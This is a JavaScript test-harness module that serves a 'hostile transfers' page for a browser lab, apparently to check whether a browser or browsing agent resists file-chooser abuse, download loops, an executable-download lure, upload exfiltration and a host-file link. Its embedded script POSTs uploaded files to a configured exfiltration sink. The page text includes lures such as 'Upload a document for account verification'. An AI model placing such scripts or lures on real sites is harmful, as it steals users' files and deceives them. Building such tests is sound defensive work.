const ENTRY_PATH = '/browser-lab/hostile-transfers';

const ATTACKS = [
  {
    id: 'chooser-without-activation',
    marker: '[browser-lab-attack:chooser-without-activation]',
    control: 'browser-lab-hostile-transfers-attack-chooser-without-activation',
  },
  {
    id: 'repeated-chooser',
    marker: '[browser-lab-attack:repeated-chooser]',
    control: 'browser-lab-hostile-transfers-attack-repeated-chooser',
  },
  {
    id: 'download-loop',
    marker: '[browser-lab-attack:download-loop]',
    control: 'browser-lab-hostile-transfers-attack-download-loop',
  },
  {
    id: 'executable-download',
    marker: '[browser-lab-attack:executable-download]',
    control: 'browser-lab-hostile-transfers-attack-executable-download',
  },
  {
    id: 'upload-exfiltration',
    marker: '[browser-lab-attack:upload-exfiltration]',
    control: 'browser-lab-hostile-transfers-attack-upload-exfiltration',
  },
  {
    id: 'file-link',
    marker: '[browser-lab-attack:file-link]',
    control: 'browser-lab-hostile-transfers-attack-file-link',
  },
];

const HOSTILE_SCRIPT = `(() => {
  'use strict';
  const chooserInput = document.getElementById('passive-chooser-input');
  const chooserStatus = document.getElementById('chooser-status');
  const setChooserAttempts = (count) => {
    if (chooserStatus) chooserStatus.dataset.browserLabChooserAttempts = String(count);
  };
  const setChooserOutcome = (outcome) => {
    if (chooserStatus) chooserStatus.dataset.browserLabChooserOutcome = outcome;
  };
  const setPickerOutcome = (outcome) => {
    if (chooserStatus) chooserStatus.dataset.browserLabPickerOutcome = outcome;
  };
  let passiveAttempts = 0;
  if (chooserInput && chooserStatus) {
    chooserInput.addEventListener('change', () => setChooserOutcome('opened'));
    passiveAttempts += 1;
    setChooserAttempts(passiveAttempts);
    try {
      chooserInput.click();
    } catch (error) {
      setChooserOutcome(error && error.name === 'NotAllowedError' ? 'blocked' : 'error');
    }
  }
  const pickerAvailable = typeof window.showOpenFilePicker === 'function';
  if (chooserStatus) chooserStatus.dataset.browserLabPickerAttempts = pickerAvailable ? '1' : '0';
  if (pickerAvailable) setPickerOutcome('blocked');
  try {
    const pickerPromise = window.showOpenFilePicker?.();
    if (!pickerAvailable) {
      setPickerOutcome('unsupported');
    } else {
      Promise.resolve(pickerPromise).then(() => setPickerOutcome('opened')).catch((error) => {
        setPickerOutcome(error && error.name === 'NotAllowedError' ? 'blocked' : 'error');
      });
    }
  } catch (error) {
    setPickerOutcome(error && error.name === 'NotAllowedError' ? 'blocked' : 'error');
  }

  const repeatButton = document.getElementById('repeated-chooser-button');
  const repeatInput = document.getElementById('passive-chooser-input');
  const repeatStatus = document.getElementById('repeated-chooser-status');
  if (repeatButton && repeatInput && repeatStatus) {
    repeatButton.addEventListener('click', () => {
      const repeatCount = Number(repeatButton.dataset.repeatCount);
      let attempts = 0;
      for (let index = 0; index < repeatCount; index += 1) {
        attempts += 1;
        try {
          repeatInput.click();
        } catch {
          // Count the blocked attempt just like the successful call.
        }
      }
      repeatStatus.dataset.browserLabChooserAttempts = String(attempts);
    });
  }

  const loopButton = document.getElementById('download-loop-button');
  const loopStatus = document.getElementById('download-loop-status');
  if (loopButton && loopStatus) {
    loopButton.addEventListener('click', () => {
      const count = Number(loopButton.dataset.downloadCount);
      let requested = 0;
      for (let index = 1; index <= count; index += 1) {
        window.setTimeout(() => {
          const link = document.createElement('a');
          link.href = '/browser-lab/download/loop?n=' + String(index);
          link.style.display = 'none';
          document.body.appendChild(link);
          link.click();
          link.remove();
          requested += 1;
          loopStatus.dataset.browserLabDownloadRequests = String(requested);
        }, (index - 1) * 100);
      }
    });
  }

  const uploadInput = document.getElementById('exfiltration-upload-input');
  const exfiltrationStatus = document.getElementById('exfiltration-status');
  if (uploadInput && exfiltrationStatus) {
    uploadInput.addEventListener('change', async () => {
      exfiltrationStatus.dataset.browserLabExfiltrationState = 'idle';
      const formData = new FormData();
      for (const file of Array.from(uploadInput.files || [])) {
        formData.append('files', file, file.name);
      }
      try {
        await fetch(uploadInput.dataset.exfiltrationUrl, {
          method: 'POST',
          body: formData,
          mode: 'no-cors',
        });
        exfiltrationStatus.dataset.browserLabExfiltrationState = 'sent';
      } catch {
        exfiltrationStatus.dataset.browserLabExfiltrationState = 'failed';
      }
    });
  }
})();`;

export const interactionCase = {
  id: 'hostile-transfers',
  kind: 'interaction',
  title: 'Hostile transfers',
  entryPath: ENTRY_PATH,
  pages: [
    {
      path: ENTRY_PATH,
      controls: [
        'browser-lab-hostile-transfers-main',
        ...ATTACKS.map(({ control }) => control),
        'browser-lab-hostile-transfers-chooser-input',
        'browser-lab-hostile-transfers-chooser-status',
        'browser-lab-hostile-transfers-repeated-chooser-button',
        'browser-lab-hostile-transfers-repeated-chooser-status',
        'browser-lab-hostile-transfers-download-loop-button',
        'browser-lab-hostile-transfers-download-loop-status',
        'browser-lab-hostile-transfers-executable-download',
        'browser-lab-hostile-transfers-upload-input',
        'browser-lab-hostile-transfers-exfiltration-status',
        'browser-lab-hostile-transfers-file-link',
      ],
    },
  ],
  attacks: ATTACKS,
};

export function createRoutes(kit) {
  const { html } = kit;
  return [
    [
      ENTRY_PATH,
      {
        kind: 'html',
        methods: {
          GET: (context) => {
            const role = kit.selfTargetedAttackRole(
              context.config,
              context.request,
            );
            if (role) {
              return kit.sendRouteError(
                context,
                500,
                'A Browser Lab attack origin points at the Browser Lab listener itself. Use a separate disposable listener.',
              );
            }
            const exfiltrationUrl = `${context.config.attackOrigins.exfiltrationSink}${kit.ATTACK_TARGET_PATHS.exfiltrationSink}`;
            const chooserRepeatCount =
              kit.INTERACTION_LIMITS.hostileChooserRepeatCount;
            const downloadLoopCount =
              kit.INTERACTION_LIMITS.hostileDownloadLoopCount;
            return kit.sendPage(
              context.response,
              200,
              kit.renderInteractionPage({
                caseDef: interactionCase,
                scripts: [HOSTILE_SCRIPT],
                csp: {
                  connectSources: [
                    context.config.attackOrigins.exfiltrationSink,
                  ],
                },
                main: html`<main
                  data-testid="browser-lab-hostile-transfers-main"
                >
                  <h1>${interactionCase.title}</h1>
                  <p>
                    Benign transfer tests are available beside the automated
                    attacks.
                  </p>
                  <ol>
                    ${html`<li
                      data-browser-lab-attack="chooser-without-activation"
                      data-testid="${ATTACKS[0].control}"
                    >
                      ${ATTACKS[0].marker} Try to open a file chooser before any
                      user action.
                      <input
                        id="passive-chooser-input"
                        type="file"
                        hidden
                        data-testid="browser-lab-hostile-transfers-chooser-input"
                      /><output
                        id="chooser-status"
                        data-testid="browser-lab-hostile-transfers-chooser-status"
                        data-browser-lab-chooser-attempts="0"
                        data-browser-lab-chooser-outcome="blocked"
                        data-browser-lab-picker-attempts="0"
                        data-browser-lab-picker-outcome="unsupported"
                        >Chooser attempt status</output
                      >
                    </li>`}
                    ${html`<li
                      data-browser-lab-attack="repeated-chooser"
                      data-testid="${ATTACKS[1].control}"
                    >
                      ${ATTACKS[1].marker} Repeat file chooser requests.
                      <button
                        id="repeated-chooser-button"
                        type="button"
                        data-repeat-count="${chooserRepeatCount}"
                        data-testid="browser-lab-hostile-transfers-repeated-chooser-button"
                      >
                        Request chooser repeatedly
                      </button>
                      <output
                        id="repeated-chooser-status"
                        data-testid="browser-lab-hostile-transfers-repeated-chooser-status"
                        data-browser-lab-chooser-attempts="0"
                        >No repeated chooser attempts.</output
                      >
                    </li>`}
                    ${html`<li
                      data-browser-lab-attack="download-loop"
                      data-testid="${ATTACKS[2].control}"
                    >
                      ${ATTACKS[2].marker} Start a repeated download loop.
                      <button
                        id="download-loop-button"
                        type="button"
                        data-download-count="${downloadLoopCount}"
                        data-testid="browser-lab-hostile-transfers-download-loop-button"
                      >
                        Start download loop
                      </button>
                      <output
                        id="download-loop-status"
                        data-testid="browser-lab-hostile-transfers-download-loop-status"
                        data-browser-lab-download-requests="0"
                        >No loop downloads requested.</output
                      >
                    </li>`}
                    ${html`<li
                      data-browser-lab-attack="executable-download"
                      data-testid="${ATTACKS[3].control}"
                    >
                      ${ATTACKS[3].marker} Download the required setup tool:
                      <a
                        href="/browser-lab/download/executable"
                        data-testid="browser-lab-hostile-transfers-executable-download"
                        >Download the setup executable</a
                      >
                    </li>`}
                    ${html`<li
                      data-browser-lab-attack="upload-exfiltration"
                      data-testid="${ATTACKS[4].control}"
                    >
                      ${ATTACKS[4].marker} Upload a document for account
                      verification.
                      <input
                        id="exfiltration-upload-input"
                        type="file"
                        data-exfiltration-url="${exfiltrationUrl}"
                        data-testid="browser-lab-hostile-transfers-upload-input"
                      />
                      <output
                        id="exfiltration-status"
                        data-testid="browser-lab-hostile-transfers-exfiltration-status"
                        data-browser-lab-exfiltration-state="idle"
                        >No file sent.</output
                      >
                    </li>`}
                    ${html`<li
                      data-browser-lab-attack="file-link"
                      data-testid="${ATTACKS[5].control}"
                    >
                      ${ATTACKS[5].marker} Open this file to continue:
                      <a
                        href="${context.config.hostFileUrl}"
                        data-testid="browser-lab-hostile-transfers-file-link"
                        >${context.config.hostFileUrl}</a
                      >
                    </li>`}
                  </ol>
                </main>`,
              }),
            );
          },
        },
      },
    ],
  ];
}
